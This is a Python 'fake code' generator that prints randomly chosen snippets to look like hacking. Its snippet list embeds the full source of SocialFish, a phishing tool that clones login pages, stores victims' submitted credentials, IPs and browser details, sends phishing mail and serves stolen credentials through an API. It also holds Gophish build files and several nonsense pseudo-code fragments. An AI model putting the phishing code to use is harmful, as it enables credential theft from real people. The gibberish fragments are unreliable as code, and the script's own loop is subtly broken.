import os
import random
import time

codes = ["""if len(man):
lokmen.start(banes)

makare()""","""import lan
ratman = 5
def banners():
    documents.start(lanserver)
    documents.stop(lanservers)
    lanservers.system.change("gorto", server=1")
break""","""import sys
import webbrowser

c = web.controler("websites.break.com/ban")
c.start

webbrowser.open("https://loggering.com")

mozilla.depencies():
    linux.google()
    bots():
        kill.all

mozilla.c $ t""","""os.system("sudo dscacheutil -flushcache && sudo killall -HUP mDNSResponder")""","""
{
  "name": "gophish",
  "version": "0.4.0-dev",
  "repository": {
    "type": "git",
    "url": "git+https://github.com/gophish/gophish.git"
  },
  "author": "Jordan Wright",
  "license": "MIT",
  "bugs": {
    "url": "https://github.com/gophish/gophish/issues"
  },
  "homepage": "https://getgophish.com",
  "devDependencies": {
    "@babel/core": "^7.4.5",
    "@babel/preset-env": "^7.4.5",
    "babel-loader": "^8.0.6",
    "clean-css": "^4.2.1",
    "gulp": "^4.0.0",
    "gulp-babel": "^8.0.0",
    "gulp-clean-css": "^4.0.0",
    "gulp-cli": "^2.2.0",
    "gulp-concat": "^2.6.1",
    "gulp-jshint": "^2.1.0",
    "gulp-rename": "^1.4.0",
    "gulp-uglify-es": "^3.0.0",
    "gulp-wrap": "^0.15.0",
    "jshint": "^2.13.4",
    "jshint-stylish": "^2.2.1",
    "webpack": "^4.32.2",
    "webpack-cli": "^3.3.2"
  },
  "dependencies": {
    "zxcvbn": "^4.4.2"
  }
}
""","""
var gulp = require('gulp'),
    rename = require('gulp-rename'),
    concat = require('gulp-concat'),
    uglify = require('gulp-uglify-es').default,
    cleanCSS = require('gulp-clean-css'),
    babel = require('gulp-babel'),

    js_directory = 'static/js/src/',
    css_directory = 'static/css/',
    vendor_directory = js_directory + 'vendor/',
    app_directory = js_directory + 'app/',
    dest_js_directory = 'static/js/dist/',
    dest_css_directory = 'static/css/dist/';

vendorjs = function () {
    return gulp.src([
            vendor_directory + 'jquery.js',
            vendor_directory + 'bootstrap.min.js',
            vendor_directory + 'moment.min.js',
            vendor_directory + 'papaparse.min.js',
            vendor_directory + 'd3.min.js',
            vendor_directory + 'topojson.min.js',
            vendor_directory + 'datamaps.min.js',
            vendor_directory + 'jquery.dataTables.min.js',
            vendor_directory + 'dataTables.bootstrap.js',
            vendor_directory + 'datetime-moment.js',
            vendor_directory + 'jquery.ui.widget.js',
            vendor_directory + 'jquery.fileupload.js',
            vendor_directory + 'jquery.iframe-transport.js',
            vendor_directory + 'sweetalert2.min.js',
            vendor_directory + 'bootstrap-datetime.js',
            vendor_directory + 'select2.min.js',
            vendor_directory + 'core.min.js',
            vendor_directory + 'highcharts.js',
            vendor_directory + 'ua-parser.min.js'
        ])
        .pipe(concat('vendor.js'))
        .pipe(rename({
            suffix: '.min'
        }))
        .pipe(uglify())
        .pipe(gulp.dest(dest_js_directory));
}

scripts = function () {
    // Gophish app files - non-ES6
    return gulp.src([
            app_directory + 'autocomplete.js',
            app_directory + 'campaign_results.js',
            app_directory + 'campaigns.js',
            app_directory + 'dashboard.js',
            app_directory + 'groups.js',
            app_directory + 'landing_pages.js',
            app_directory + 'sending_profiles.js',
            app_directory + 'settings.js',
            app_directory + 'templates.js',
            app_directory + 'gophish.js',
            app_directory + 'users.js',
            app_directory + 'webhooks.js',
            app_directory + 'passwords.js'
        ])
        .pipe(rename({
            suffix: '.min'
        }))
        .pipe(uglify().on('error', function (e) {
            console.log(e);
        }))
        .pipe(gulp.dest(dest_js_directory + 'app/'));
}

styles = function () {
    return gulp.src([
            css_directory + 'bootstrap.min.css',
            css_directory + 'main.css',
            css_directory + 'dashboard.css',
            css_directory + 'flat-ui.css',
            css_directory + 'dataTables.bootstrap.css',
            css_directory + 'font-awesome.min.css',
            css_directory + 'chartist.min.css',
            css_directory + 'bootstrap-datetime.css',
            css_directory + 'checkbox.css',
            css_directory + 'sweetalert2.min.css',
            css_directory + 'select2.min.css',
            css_directory + 'select2-bootstrap.min.css',
        ])
        .pipe(cleanCSS({
            compatibilty: 'ie9'
        }))
        .pipe(concat('gophish.css'))
        .pipe(gulp.dest(dest_css_directory));
}

exports.vendorjs = vendorjs
exports.scripts = scripts
exports.styles = styles
exports.build = gulp.parallel(vendorjs, scripts, styles)
exports.default = exports.build""","""
FROM node:latest AS build-js

RUN npm install gulp gulp-cli -g

WORKDIR /build
COPY . .
RUN npm install --only=dev
RUN gulp


# Build Golang binary
FROM golang:1.15.2 AS build-golang

WORKDIR /go/src/github.com/gophish/gophish
COPY . .
RUN go get -v && go build -v


# Runtime container
FROM debian:stable-slim

RUN useradd -m -d /opt/gophish -s /bin/bash app

RUN apt-get update && \
	apt-get install --no-install-recommends -y jq libcap2-bin && \
	apt-get clean && \
	rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

WORKDIR /opt/gophish
COPY --from=build-golang /go/src/github.com/gophish/gophish/ ./
COPY --from=build-js /build/static/js/dist/ ./static/js/dist/
COPY --from=build-js /build/static/css/dist/ ./static/css/dist/
COPY --from=build-golang /go/src/github.com/gophish/gophish/config.json ./
RUN chown app. config.json

RUN setcap 'cap_net_bind_service=+ep' /opt/gophish/gophish

USER app
RUN sed -i 's/127.0.0.1/0.0.0.0/g' config.json
RUN touch config.json.tmp

EXPOSE 3333 8080 8443 80

CMD ["./docker/run.sh"]""","""
package imap

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"regexp"
	"strconv"
	"time"

	"github.com/emersion/go-imap"
	"github.com/emersion/go-imap/client"
	"github.com/emersion/go-message/charset"
	"github.com/gophish/gophish/dialer"
	log "github.com/gophish/gophish/logger"
	"github.com/gophish/gophish/models"

	"github.com/jordan-wright/email"
)

// Client interface for IMAP interactions
type Client interface {
	Login(username, password string) (cmd *imap.Command, err error)
	Logout(timeout time.Duration) (cmd *imap.Command, err error)
	Select(name string, readOnly bool) (mbox *imap.MailboxStatus, err error)
	Store(seq *imap.SeqSet, item imap.StoreItem, value interface{}, ch chan *imap.Message) (err error)
	Fetch(seqset *imap.SeqSet, items []imap.FetchItem, ch chan *imap.Message) (err error)
}

// Email represents an email.Email with an included IMAP Sequence Number
type Email struct {
	SeqNum uint32 `json:"seqnum"`
	*email.Email
}

// Mailbox holds onto the credentials and other information
// needed for connecting to an IMAP server.
type Mailbox struct {
	Host             string
	TLS              bool
	IgnoreCertErrors bool
	User             string
	Pwd              string
	Folder           string
	// Read only mode, false (original logic) if not initialized
	ReadOnly bool
}

// Validate validates supplied IMAP model by connecting to the server
func Validate(s *models.IMAP) error {
	err := s.Validate()
	if err != nil {
		log.Error(err)
		return err
	}

	s.Host = s.Host + ":" + strconv.Itoa(int(s.Port)) // Append port
	mailServer := Mailbox{
		Host:             s.Host,
		TLS:              s.TLS,
		IgnoreCertErrors: s.IgnoreCertErrors,
		User:             s.Username,
		Pwd:              s.Password,
		Folder:           s.Folder}

	imapClient, err := mailServer.newClient()
	if err != nil {
		log.Error(err.Error())
	} else {
		imapClient.Logout()
	}
	return err
}

// MarkAsUnread will set the UNSEEN flag on a supplied slice of SeqNums
func (mbox *Mailbox) MarkAsUnread(seqs []uint32) error {
	imapClient, err := mbox.newClient()
	if err != nil {
		return err
	}

	defer imapClient.Logout()

	seqSet := new(imap.SeqSet)
	seqSet.AddNum(seqs...)

	item := imap.FormatFlagsOp(imap.RemoveFlags, true)
	err = imapClient.Store(seqSet, item, imap.SeenFlag, nil)
	if err != nil {
		return err
	}

	return nil

}

// DeleteEmails will delete emails from the supplied slice of SeqNums
func (mbox *Mailbox) DeleteEmails(seqs []uint32) error {
	imapClient, err := mbox.newClient()
	if err != nil {
		return err
	}

	defer imapClient.Logout()

	seqSet := new(imap.SeqSet)
	seqSet.AddNum(seqs...)

	item := imap.FormatFlagsOp(imap.AddFlags, true)
	err = imapClient.Store(seqSet, item, imap.DeletedFlag, nil)
	if err != nil {
		return err
	}

	return nil
}

// GetUnread will find all unread emails in the folder and return them as a list.
func (mbox *Mailbox) GetUnread(markAsRead, delete bool) ([]Email, error) {
	imap.CharsetReader = charset.Reader
	var emails []Email

	imapClient, err := mbox.newClient()
	if err != nil {
		return emails, fmt.Errorf("failed to create IMAP connection: %s", err)
	}

	defer imapClient.Logout()

	// Search for unread emails
	criteria := imap.NewSearchCriteria()
	criteria.WithoutFlags = []string{imap.SeenFlag}
	seqs, err := imapClient.Search(criteria)
	if err != nil {
		return emails, err
	}

	if len(seqs) == 0 {
		return emails, nil
	}

	seqset := new(imap.SeqSet)
	seqset.AddNum(seqs...)
	section := &imap.BodySectionName{}
	items := []imap.FetchItem{imap.FetchEnvelope, imap.FetchFlags, imap.FetchInternalDate, section.FetchItem()}
	messages := make(chan *imap.Message)

	go func() {
		if err := imapClient.Fetch(seqset, items, messages); err != nil {
			log.Error("Error fetching emails: ", err.Error()) // TODO: How to handle this, need to propogate error out
		}
	}()

	// Step through each email
	for msg := range messages {
		// Extract raw message body. I can't find a better way to do this with the emersion library
		var em *email.Email
		var buf []byte
		for _, value := range msg.Body {
			buf = make([]byte, value.Len())
			value.Read(buf)
			break // There should only ever be one item in this map, but I'm not 100% sure
		}

		//Remove CR characters, see https://github.com/jordan-wright/email/issues/106
		tmp := string(buf)
		re := regexp.MustCompile(`\r`)
		tmp = re.ReplaceAllString(tmp, "")
		buf = []byte(tmp)

		rawBodyStream := bytes.NewReader(buf)
		em, err = email.NewEmailFromReader(rawBodyStream) // Parse with @jordanwright's library
		if err != nil {
			return emails, err
		}

		emtmp := Email{Email: em, SeqNum: msg.SeqNum} // Not sure why msg.Uid is always 0, so swapped to sequence numbers
		emails = append(emails, emtmp)

	}
	return emails, nil
}

// newClient will initiate a new IMAP connection with the given creds.
func (mbox *Mailbox) newClient() (*client.Client, error) {
	var imapClient *client.Client
	var err error
	restrictedDialer := dialer.Dialer()
	if mbox.TLS {
		config := new(tls.Config)
		config.InsecureSkipVerify = mbox.IgnoreCertErrors
		imapClient, err = client.DialWithDialerTLS(restrictedDialer, mbox.Host, config)
	} else {
		imapClient, err = client.DialWithDialer(restrictedDialer, mbox.Host)
	}
	if err != nil {
		return imapClient, err
	}

	err = imapClient.Login(mbox.User, mbox.Pwd)
	if err != nil {
		return imapClient, err
	}

	_, err = imapClient.Select(mbox.Folder, mbox.ReadOnly)
	if err != nil {
		return imapClient, err
	}

	return imapClient, nil
}
""","""
UndeadSec
/
SocialFish
Public
Code
Issues
15
Pull requests
2
Actions
Projects
Wiki
Security
Insights
SocialFish/SocialFish.py
@franklintimoteo
franklintimoteo Revert "Fixing clone module"
…
 7 contributors
545 lines (494 sloc)  18.8 KB
#!/usr/bin/env python3
#
from flask import Flask, request, render_template, jsonify, redirect, g, flash
from core.config import *
from core.view import head
from core.scansf import nScan
from core.clonesf import clone
from core.dbsf import initDB
from core.genToken import genToken, genQRCode
from core.sendMail import sendMail
from core.tracegeoIp import tracegeoIp
from core.cleanFake import cleanFake
from core.genReport import genReport
from core.report import generate_unique #>> new line
from datetime import date
from sys import argv, exit, version_info
import colorama
import sqlite3
import flask_login
import os

# Verificar argumentos
if len(argv) < 2:
    print("./SocialFish <youruser> <yourpassword>\n\ni.e.: ./SocialFish.py root pass")
    exit(0)

# Temporario
try:
    users = {argv[1]: {'password': argv[2]}}
except IndexError:
    print("./SocialFish <youruser> <yourpassword>\n\ni.e.: ./SocialFish.py root pass")
    exit(0)
# Definicoes do flask
app = Flask(__name__, static_url_path='',
            static_folder='templates/static')
app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0

# Inicia uma conexao com o banco antes de cada requisicao
@app.before_request
def before_request():
    g.db = sqlite3.connect(DATABASE)

# Finaliza a conexao com o banco apos cada conexao
@app.teardown_request
def teardown_request(exception):
    if hasattr(g, 'db'):
        g.db.close()

# Conta o numero de credenciais salvas no banco
def countCreds():
    count = 0
    cur = g.db
    select_all_creds = cur.execute("SELECT id, url, pdate, browser, bversion, platform, rip FROM creds order by id desc")
    for i in select_all_creds:
        count += 1
    return count

# Conta o numero de visitantes que nao foram pegos no phishing
def countNotPickedUp():
    count = 0

    cur = g.db
    select_clicks = cur.execute("SELECT clicks FROM socialfish where id = 1")

    for i in select_clicks:
        count = i[0]

    count = count - countCreds()
    return count

#----------------------------------------

# definicoes do flask e de login
app.secret_key = APP_SECRET_KEY
login_manager = flask_login.LoginManager()
login_manager.init_app(app)

class User(flask_login.UserMixin):
    pass

@login_manager.user_loader
def user_loader(email):
    if email not in users:
        return

    user = User()
    user.id = email
    return user


@login_manager.request_loader
def request_loader(request):
    email = request.form.get('email')
    if email not in users:
        return

    user = User()
    user.id = email
    user.is_authenticated = request.form['password'] == users[email]['password']

    return user

# ---------------------------------------------------------------------------------------

# Rota para o caminho de inicializacao, onde e possivel fazer login
@app.route('/neptune', methods=['GET', 'POST'])
def admin():
    # se a requisicao for get
    if request.method == 'GET':
        # se o usuario estiver logado retorna para a pagina de credenciais
        if flask_login.current_user.is_authenticated:
            return redirect('/creds')
        # caso contrario retorna para a pagina de login
        else:
            return render_template('signin.html')

    # se a requisicao for post, verifica-se as credencias
    if request.method == 'POST':
        email = request.form['email']
        try:
            # caso sejam corretas
            if request.form['password'] == users[email]['password']:
                user = User()
                user.id = email
                # torna autentico
                flask_login.login_user(user)
                # retorna acesso a pagina restrita
                return redirect('/creds')
            # contrario retorna erro
            else:
                # temporario
                return "bad"
        except:
            return "bad"

# funcao onde e realizada a renderizacao da pagina para a vitima
@app.route("/")
def getLogin():
    # caso esteja configurada para clonar, faz o download da pagina utilizando o user-agent do visitante
    if sta == 'clone':
        agent = request.headers.get('User-Agent').encode('ascii', 'ignore').decode('ascii')
        clone(url, agent, beef)
        o = url.replace('://', '-')
        cur = g.db
        cur.execute("UPDATE socialfish SET clicks = clicks + 1 where id = 1")
        g.db.commit()
        template_path = 'fake/{}/{}/index.html'.format(agent, o)
        return render_template(template_path)
    # caso seja a url padrao
    elif url == 'https://github.com/UndeadSec/SocialFish':
        return render_template('default.html')
    # caso seja configurada para custom
    else:
        cur = g.db
        cur.execute("UPDATE socialfish SET clicks = clicks + 1 where id = 1")
        g.db.commit()
        return render_template('custom.html')

# funcao onde e realizado o login por cada pagina falsa
@app.route('/login', methods=['POST'])
def postData():
    if request.method == "POST":
        fields = [k for k in request.form]
        values = [request.form[k] for k in request.form]
        data = dict(zip(fields, values))
        browser = str(request.user_agent.browser)
        bversion = str(request.user_agent.version)
        platform = str(request.user_agent.platform)
        rip = str(request.remote_addr)
        d = "{:%m-%d-%Y}".format(date.today())
        cur = g.db
        sql = "INSERT INTO creds(url,jdoc,pdate,browser,bversion,platform,rip) VALUES(?,?,?,?,?,?,?)"
        creds = (url, str(data), d, browser, bversion, platform, rip)
        cur.execute(sql, creds)
        g.db.commit()
    return redirect(red)

# funcao para configuracao do funcionamento CLONE ou CUSTOM, com BEEF ou NAO
@app.route('/configure', methods=['POST'])
def echo():
    global url, red, sta, beef
    red = request.form['red']
    sta = request.form['status']
    beef = request.form['beef']

    if sta == 'clone':
        url = request.form['url']
    else:
        url = 'Custom'

    if len(url) > 4 and len(red) > 4:
        if 'http://' not in url and sta != '1' and 'https://' not in url:
            url = 'http://' + url
        if 'http://' not in red and 'https://' not in red:
            red = 'http://' + red
    else:
        url = 'https://github.com/UndeadSec/SocialFish'
        red = 'https://github.com/UndeadSec/SocialFish'
    cur = g.db
    cur.execute("UPDATE socialfish SET attacks = attacks + 1 where id = 1")
    g.db.commit()
    return redirect('/creds')

# pagina principal do dashboard
@app.route("/creds")
@flask_login.login_required
def getCreds():
    cur = g.db
    attacks = cur.execute("SELECT attacks FROM socialfish where id = 1").fetchone()[0]
    clicks = cur.execute("SELECT clicks FROM socialfish where id = 1").fetchone()[0]
    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
    data = cur.execute("SELECT id, url, pdate, browser, bversion, platform, rip FROM creds order by id desc").fetchall()
    return render_template('admin/index.html', data=data, clicks=clicks, countCreds=countCreds, countNotPickedUp=countNotPickedUp, attacks=attacks, tokenapi=tokenapi)

# pagina para envio de emails
@app.route("/mail", methods=['GET', 'POST'])
@flask_login.login_required
def getMail():
    if request.method == 'GET':
        cur = g.db
        email = cur.execute("SELECT email FROM sfmail where id = 1").fetchone()[0]
        smtp = cur.execute("SELECT smtp FROM sfmail where id = 1").fetchone()[0]
        port = cur.execute("SELECT port FROM sfmail where id = 1").fetchone()[0]
        return render_template('admin/mail.html', email=email, smtp=smtp, port=port)
    if request.method == 'POST':
        subject = request.form['subject']
        email = request.form['email']
        password = request.form['password']
        recipient = request.form['recipient']
        body = request.form['body']
        smtp = request.form['smtp']
        port = request.form['port']
        sendMail(subject, email, password, recipient, body, smtp, port)
        cur = g.db
        cur.execute("UPDATE sfmail SET email = '{}' where id = 1".format(email))
        cur.execute("UPDATE sfmail SET smtp = '{}' where id = 1".format(smtp))
        cur.execute("UPDATE sfmail SET port = '{}' where id = 1".format(port))
        g.db.commit()
        return redirect('/mail')

# Rota para consulta de log
@app.route("/single/<id>", methods=['GET'])
@flask_login.login_required
def getSingleCred(id):
    try:
        sql = "SELECT jdoc FROM creds where id = {}".format(id)
        cur = g.db
        credInfo = cur.execute(sql).fetchall()
        if len(credInfo) > 0:
            return render_template('admin/singlecred.html', credInfo=credInfo)
        else:
            return "Not found"
    except:
        return "Bad parameter"

# rota para rastreio de ip
@app.route("/trace/<ip>", methods=['GET'])
@flask_login.login_required
def getTraceIp(ip):
    try:
        traceIp = tracegeoIp(ip)
        return render_template('admin/traceIp.html', traceIp=traceIp, ip=ip)
    except:
        return "Network Error"

# rota para scan do nmap
@app.route("/scansf/<ip>", methods=['GET'])
@flask_login.login_required
def getScanSf(ip):
    return render_template('admin/scansf.html', nScan=nScan, ip=ip)

# rota post para revogar o token da api
@app.route("/revokeToken", methods=['POST'])
@flask_login.login_required
def revokeToken():
    revoke = request.form['revoke']
    if revoke == 'yes':
        cur = g.db
        upsql = "UPDATE socialfish SET token = '{}' where id = 1".format(genToken())
        cur.execute(upsql)
        g.db.commit()
        token = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
        genQRCode(token, revoked=True)
    return redirect('/creds')

# pagina para gerar relatorios
@app.route("/report", methods=['GET', 'POST'])
@flask_login.login_required
def getReport():
    if request.method == 'GET':
        cur = g.db
        urls = cur.execute("SELECT DISTINCT url FROM creds").fetchall()
        users = cur.execute("SELECT name FROM professionals").fetchall()
        companies = cur.execute("SELECT name FROM companies").fetchall()
        uniqueUrls = []
        for u in urls:
            if u not in uniqueUrls:
                uniqueUrls.append(u[0])
        return render_template('admin/report.html', uniqueUrls=uniqueUrls, users=users, companies=companies)
    if request.method == 'POST':
        subject = request.form['subject']
        user = request.form['selectUser']
        company = request.form['selectCompany']
        date_range = request.form['datefilter']
        target = request.form['selectTarget']
        _target = 'All' if target=='0' else target
        genReport(DATABASE, subject, user, company, date_range, _target)
        generate_unique(DATABASE,_target)
        return redirect('/report')

# pagina para cadastro de profissionais
@app.route("/professionals", methods=['GET', 'POST'])
@flask_login.login_required
def getProfessionals():
    if request.method == 'GET':
        return render_template('admin/professionals.html')
    if request.method == 'POST':
        name = request.form['name']
        email = request.form['email']
        obs = request.form['obs']
        sql = "INSERT INTO professionals(name,email,obs) VALUES(?,?,?)"
        info = (name, email, obs)
        cur = g.db
        cur.execute(sql, info)
        g.db.commit()
        return redirect('/professionals')

# pagina para cadastro de empresas
@app.route("/companies", methods=['GET', 'POST'])
@flask_login.login_required
def getCompanies():
    if request.method == 'GET':
        return render_template('admin/companies.html')
    if request.method == 'POST':
        name = request.form['name']
        email = request.form['email']
        phone = request.form['phone']
        address = request.form['address']
        site = request.form['site']
        sql = "INSERT INTO companies(name,email,phone,address,site) VALUES(?,?,?,?,?)"
        info = (name, email, phone, address, site)
        cur = g.db
        cur.execute(sql, info)
        g.db.commit()
        return redirect('/companies')

# rota para gerenciamento de usuarios
@app.route("/sfusers/", methods=['GET'])
@flask_login.login_required
def getSfUsers():
    return render_template('admin/sfusers.html')

#--------------------------------------------------------------------------------------------------------------------------------
#LOGIN VIEWS

@app.route('/logout')
def logout():
    flask_login.logout_user()
    return 'Logged out'

@login_manager.unauthorized_handler
def unauthorized_handler():
    return 'Unauthorized'

#--------------------------------------------------------------------------------------------------------------------------------
# MOBILE API

# VERIFICAR CHAVE
@app.route("/api/checkKey/<key>", methods=['GET'])
def checkKey(key):
    cur = g.db
    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
    if key == tokenapi:
        status = {'status':'ok'}
    else:
        status = {'status':'bad'}
    return jsonify(status)

@app.route("/api/statistics/<key>", methods=['GET'])
def getStatics(key):
    cur = g.db
    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
    if key == tokenapi:
        cur = g.db
        attacks = cur.execute("SELECT attacks FROM socialfish where id = 1").fetchone()[0]
        clicks = cur.execute("SELECT clicks FROM socialfish where id = 1").fetchone()[0]
        countC = countCreds()
        countNPU = countNotPickedUp()
        info = {'status':'ok','attacks':attacks, 'clicks':clicks, 'countCreds':countC, 'countNotPickedUp':countNPU}
    else:
        info = {'status':'bad'}
    return jsonify(info)

@app.route("/api/getJson/<key>", methods=['GET'])
def getJson(key):
    cur = g.db
    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
    if key == tokenapi:
        try:
            sql = "SELECT * FROM creds"
            cur = g.db
            credInfo = cur.execute(sql).fetchall()
            listCreds = []
            if len(credInfo) > 0:
                for c in credInfo:
                    cred = {'id':c[0],'url':c[1], 'post':c[2], 'date':c[3], 'browser':c[4], 'version':c[5],'os':c[6],'ip':c[7]}
                    listCreds.append(cred)
            else:
                credInfo = {'status':'nothing'}
            return jsonify(listCreds)
        except:
            return "Bad parameter"
    else:
        credInfo = {'status':'bad'}
        return jsonify(credInfo)

@app.route('/api/configure', methods = ['POST'])
def postConfigureApi():
    global url, red, sta, beef
    if request.is_json:
        content = request.get_json()
        cur = g.db
        tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
        if content['key'] == tokenapi:
            red = content['red']
            beef = content['beef']
            if content['sta'] == 'clone':
                sta = 'clone'
                url = content['url']
            else:
                sta = 'custom'
                url = 'Custom'

            if url != 'Custom':
                if len(url) > 4:
                    if 'http://' not in url and sta != '1' and 'https://' not in url:
                        url = 'http://' + url
            if len(red) > 4:
                if 'http://' not in red and 'https://' not in red:
                    red = 'http://' + red
            else:
                red = 'https://github.com/UndeadSec/SocialFish'
            cur = g.db
            cur.execute("UPDATE socialfish SET attacks = attacks + 1 where id = 1")
            g.db.commit()
            status = {'status':'ok'}
        else:
            status = {'status':'bad'}
    else:
        status = {'status':'bad'}
    return jsonify(status)

@app.route("/api/mail", methods=['POST'])
def postSendMail():
    if request.is_json:
        content = request.get_json()
        cur = g.db
        tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
        if content['key'] == tokenapi:
            subject = content['subject']
            email = content['email']
            password = content['password']
            recipient = content['recipient']
            body = content['body']
            smtp = content['smtp']
            port = content['port']
            if sendMail(subject, email, password, recipient, body, smtp, port) == 'ok':
                cur = g.db
                cur.execute("UPDATE sfmail SET email = '{}' where id = 1".format(email))
                cur.execute("UPDATE sfmail SET smtp = '{}' where id = 1".format(smtp))
                cur.execute("UPDATE sfmail SET port = '{}' where id = 1".format(port))
                g.db.commit()
                status = {'status':'ok'}
            else:
                status = {'status':'bad','error':str(sendMail(subject, email, password, recipient, body, smtp, port))}
        else:
            status = {'status':'bad'}
    else:
        status = {'status':'bad'}
    return jsonify(status)
"""]

def menu():
    os.system("clear")
    print ("\033[34mCoder V1.0.0\033[0m")
    print ("\n[1] Start Fake Code")
    print ("[2] Exit\n")
    choice = input("Choice $ ")
    if choice == "1":
        start()
    elif choice == "2":
        os.system("clear")
        os.system("exit")
    else:
        menu()
        
def start():
    os.system("clear")
    print ("\033[32mGenerating Codes ...")
    time.sleep(0.5)
    print ("Randomly Selected From Codes ...")
    one = random.choice(codes)
    time.sleep(1)
    print ("Creating Console...")
    code = ""
    go = 0
    max_codes = random.randint(5, 10)
    time.sleep(1)
    print ("Writing the Code ...")
    time.sleep(1)
    while True:
        one = random.choice(codes)
        code += one
        go += 1
        if max_codes == go:
            print ("Sucessfuly !")
            time.sleep(0.5)
            os.system("clear")
            print ("Showing ...\n\n\n")
            time.sleep(0.5)
            print (code)
            
menu()
    
    
    
    
    
